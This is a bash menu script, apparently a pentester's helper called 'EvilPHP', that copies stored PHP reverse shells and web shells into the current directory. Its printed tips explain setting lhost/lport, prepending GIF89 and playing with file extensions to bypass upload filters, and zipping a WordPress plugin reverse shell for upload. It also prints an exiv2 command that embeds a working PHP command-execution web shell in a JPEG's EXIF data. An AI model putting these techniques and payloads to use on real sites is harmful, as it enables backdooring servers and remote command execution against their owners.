#!/bin/bash

# copy all php shells to ~/shells/
# just add another case for new ones!
# create a symlink for this to /usr/local/bin/evilphp or whatever!

# colours first
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${RED}"
figlet "EvilPHP"
echo -e "${NC}"
echo -e "${YELLOW}[+] Grab a PHP Shell of Eevil${NC}"

echo -e ""
echo -e "${BLUE}"
echo -e "Which shell would you like?"
echo -e "1 = reverse-php-shell (evil.php)"
echo -e "1a = Tiny php revshell (tiny.php)"
echo -e "1b = New php revshell (new.php)"
echo -e "2 = jpg header revshell (evil.jpg)"
echo -e "3 = simple-web-shell (shell.php)"
echo -e "4 = Wwolf-php-webshell (wolfwebshell.php)"
echo -e "5 = List of webshells to try"
echo -e "6 = Wordpress Plugin revshell (wp-evil.php)"
echo -e "7 = Jpeg with Exif impregnated webshell (sh1n.php5.jpg)"
echo -e "${NC}"
echo -e ""


# Case Statement
echo -e "${RED}"
read -p "Enter Selection: " shelltype
echo -e "${NC}"

# if no input prompt for a number
if [ -z $shelltype ];then
	echo "Just a number please..."
	exit
fi

case $shelltype in
	1)
	echo -e "Copying evil.php to your pwd..."
	echo -e "Just remember to amend lhost and lport!"
	echo -e "${YELLOW}For a .gif file prepend GIF89 to the file${NC}"
	cp ~/shells/evil.php .
	;;

	1a)
	echo -e "Copying tiny.php to your pwd..."
	echo -e "Just remember to amend lhost and lport!"
	cp ~/shells/tiny.php .
	;;


	1b)
	echo -e "Copying new.php to your pwd..."
	echo -e "https://github.com/ivan-sincek/php-reverse-shell.git"
	echo -e "This repo is cloned in /opt folder, and worth checking out!"
	cp ~/shells/new.php .
	;;


	2)
	echo -e "Copying evil.jpg to your pwd..."
	echo -e "You may need to play with file extensions to bypass filters"
	cp ~/shells/evil.jpg .
	;;


	3)
	echo -e "Copying shell.php to your pwd..."
	cp ~/shells/shell.php .
	;;

	4)
	echo -e "Copying wolfwebshell.php to your pwd..."
	cp ~/shells/wolfwebshell.php .
	;;


	5)
	echo -e "${YELLOW}If the webshell is not working, try one of these...${NC}"
	cat ~/shells/php-shell-injection.txt
	;;


	6)
	echo -e "Copying wp-evil.php to your pwd..."
	echo -e "Just amend lhost and lport, then zip it up and upload it!"
	echo -e "${BLUE}7z a wp-evil.zip wp-evil.php${NC}"
	cp ~/shells/wp-evil.php .
	;;


	7)
	echo -e "Copying sh1n.php5.jpg to your pwd..."
	echo -e "You may need to play with file extensions to bypass filters."
	echo -e "${YELLOW}example: Inject a .jpg file with a webshell...${NC}"
	echo -e "${YELLOW}exiv2 -c'A \"<?php system(\$_REQUEST['cmd']);?>\"!' backdoor.jpeg${NC}"
	cp ~/shells/sh1n.php5.jpg .
	;;


	*)
	echo -e "${RED}[-] Sorry,Not Found! ${NC}"
	echo -e ""
	exit

esac
